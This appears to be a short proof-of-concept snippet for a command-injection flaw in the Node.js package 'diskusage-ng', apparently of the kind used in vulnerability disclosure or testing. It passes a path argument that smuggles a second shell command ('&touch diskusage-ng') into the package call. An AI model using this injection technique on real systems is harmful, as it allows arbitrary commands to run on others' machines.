const root = require("diskusage-ng");
try {
  root(['"&touch diskusage-ng"'], () => {});
} catch (err) {}
